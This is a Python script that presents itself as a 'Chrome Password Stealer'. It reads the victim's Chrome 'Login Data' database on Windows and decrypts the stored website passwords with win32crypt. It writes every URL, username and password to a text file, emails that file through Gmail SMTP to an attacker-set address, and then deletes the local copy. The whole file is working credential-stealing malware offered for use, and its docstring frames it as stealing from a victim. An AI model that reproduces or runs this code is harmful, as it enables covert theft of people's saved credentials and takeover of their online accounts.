
'''
#######################CHROME PASSWORD STEALER#######################
#######################By: Abhishek Iyengar##########################
#######################GitHub: TinShade##############################
#######################Twitter: @TinShade############################

This small script goes through the local DB used by chrome to store user data like usernames and passwords 
to websites that have auto-save for authentication fields. Most users like to hit save for convenience; this 
script exploits that nature of the victim to steal all stored data and mail it to the email ID in the mail module.

'''
#Sending mail with attachment
def mail():
	#NOTE: Make sure you have your email account set to allow 'Less Secure App Access'. Especially for GMail accounts.

	import smtplib 
	from email.mime.multipart import MIMEMultipart 
	from email.mime.text import MIMEText 
	from email.mime.base import MIMEBase 
	from email import encoders 

	fromaddr = "YOUR EMAIL ID"
	toaddr = "YOUR EMAIL ID"
	msg = MIMEMultipart() 
	msg['From'] = fromaddr 
	msg['To'] = toaddr 
	msg['Subject'] = "Chrome DB data"
	body = "Find the attached txt file for the database details!"
	msg.attach(MIMEText(body, 'plain')) 
	filename = "pass.txt"
	attachment = open("pass.txt", "rb") 
	p = MIMEBase('application', 'octet-stream') 
	p.set_payload((attachment).read()) 
	encoders.encode_base64(p) 

	p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
	msg.attach(p) 
	s = smtplib.SMTP('smtp.gmail.com', 587) 
	s.starttls() 
	s.login(fromaddr, "YOUR PASSWORD") 
	text = msg.as_string() 
	s.sendmail(fromaddr, toaddr, text) 
	s.quit() 

#Getting data from the chrome local DB
#The path and DB variables are working as of March 2020. However, this might change for future versions of Chrome.
def get_chrome():
	import os
	import sqlite3
	import win32crypt

    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        with open("pass.txt","w+") as f:
        	f.write(string)
        	f.close()
        
    mail()
    os.remove("pass.txt")


if __name__=='__main__':
    get_chrome()